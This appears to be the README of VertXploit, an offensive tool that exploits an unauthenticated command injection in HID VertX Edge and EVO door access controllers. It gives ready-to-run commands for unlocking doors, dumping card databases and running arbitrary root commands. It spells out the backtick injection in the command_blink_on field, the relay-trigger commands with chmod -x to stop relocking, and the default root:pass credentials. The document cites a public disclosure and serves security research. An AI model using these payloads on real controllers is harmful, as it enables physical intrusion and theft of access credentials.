# VertXploit
Exploiting HID VertX physical access control systems

## Summary ##
VertXploit is a tool that can be used to exploit HID VertX Edge and EVO access control systems. 

A vulnerability exists within the discoveryd service, which fails to sanitize user data before executing system calls. This allows for arbitrary code execution on HID VertX Edge and EVO access control systems without needing to be authenticated. See the [Command Injection](https://github.com/coldfusion39/VertXploit/blob/master/README.md#command-injection) section for more information.

VertXploit can unlock or lock doors connected to the access control system, download the databases containing all of the provisioned/cached access control cards, and execute arbitrary commands as root on the VertX system, if vulnerable.

If the VertX controller's firmware has been recently updated, vertXploit will attempt to unlock or lock the doors through the web console by using the default, or user supplied, username and password.


## Requirements ##
Run `pip install -r requirements.txt` to install the required python modules.
 * [netifaces](https://bitbucket.org/al45tair/netifaces)
 * [python-nmap](https://bitbucket.org/xael/python-nmap)
 * [requests](https://github.com/kennethreitz/requests)
 * [tabulate](https://bitbucket.org/astanin/python-tabulate)


## VertXploit Usage ##
If the `-i IP` argument is not provided, vertXploit will attempt to discover all VertX access control system on the local network. If a controller is found, vertXploit will continue to execute the user supplied action that was provided with the `-a [discover, unlock, lock, download]` or `-raw` arguments.


### Discover ###
Run vertXploit with just the `-a discover` argument to discover all VertX access control systems on the local network. To check a specific system and return detailed information, run vertXploit with the `-a discover` argument and an IP address `-i IP`.

Example:

`./vertXploit.py`

`./vertXploit.py -i 10.1.10.5`


### Unlock/Lock ###
In order to unlock or lock doors connected to a VertX access control system, run vertXploit with the `-a unlock` or `-a lock` arguments. If the controller is not vulnerable to the command injection exploit, vertXploit will attempt to unlock or lock the doors through the web console. This method uses the default username and password of 'root:pass', or you can supply your own with the `--username USERNAME` and `--password PASSWORD` arguments.

Example:

`./vertXploit.py -a unlock -i 10.1.10.5`


### Download ###
To download the VertX card databases, run vertXploit with the `-a download` argument. The controller must be vulnerable to the command injection exploit.

Example:

`./vertXploit.py -a download -i 10.1.10.5`


### Raw ###
Arbitrary Linux commands can be executed on a VertX access control system by using the `-raw COMMAND` argument. Depending on the command being sent, the controller may not be able to execute the command because it is not installed (i.e. Python, PERL, ruby, etc). As a simple proof of concept, the Linux 'ping' command seems to work on all VertX models tested.

Example:

`./vertXploit.py -raw 'ping -c 5 10.1.10.39' -i 10.1.10.5`


## VertXparse Usage ##
After downloading the VertX 'IdentDB' and 'AccessDB', but using the the `-a download` argument, run vertXparse to dump the contents of the databases.

Example:

`./vertXparse.py`



## Command Injection ##
Typically multiple VertX controllers are installed and housed together. The diagnostic command `command_blink_on` can be sent to a specific controller, which causes the panel's physical "Comm" LED to blink on and off for visual identification. This command usually terminates with the number of times the LED should blink, in the following case, 30 times.

`command_blink_on;042;<MAC_ADDRESS>;30;`

By replacing the number of blinks with a Linux command wrapped in back ticks, the command will be executed on the VertX controller, as root.

``command_blink_on;042;<MAC_ADDRESS>;`ping -c 5 10.1.10.39`;``

To remotely unlock and lock doors connected to the VertX access control system, commands are echoed to `/tmp/a`. This is done because there is a length limit of 22 characters, for each command, that can be sent to the controller. <i>Note: echo is used instead of printf because some older VertX controllers are running BusyBox < 1.0.1 which does not include printf.</i>

Newlines from echoing the commands into the file are then removed by running `tr -d '\n' < /tmp/a > /tmp/b` and intentional newlines are inserted by running `tr '!' '\n' < /tmp/b > /tmp/a`.

The script `/tmp/a` is then executed and both files are deleted. Below shows what commands are being echoed into `/tmp/a` when the unlock and lock commands are sent to the VertX controller.

### Unlock ###
	# Set QUERY_STRING to the door unlock value
	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=1"

	# Run 'diagnostics_execute.cgi' script
	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi

	# Remove executable permissions to prevent the door from locking
	chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi

### Lock ###
	# Enable executable permissions
	chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi

	# Set QUERY_STRING to the door lock value
	export QUERY_STRING="?ID=0&BoardType=VXXX&Description=Strike&Relay=1&Action=0"

	# Run 'diagnostics_execute.cgi' script
	/mnt/apps/web/cgi-bin/diagnostics_execute.cgi



## Resources ##
* [HeadlessZeke](https://github.com/headlesszeke/defcon24-demos) - Command injection vulnerability
* [ZDI](http://www.zerodayinitiative.com/advisories/ZDI-16-223/) - Public disclosure
* [TrendMicro Blog](http://blog.trendmicro.com/let-get-door-remote-root-vulnerability-hid-door-controllers/) - Blog on command injection vulnerability
* [Brad Antoniewicz](http://nosedookie.blogspot.com/2011/07/hid-vertx-v2000-card-number-cache-tool.html) - Parsing card numbers from VertX cache
* [Other Work](http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html) - VertX discovery commands
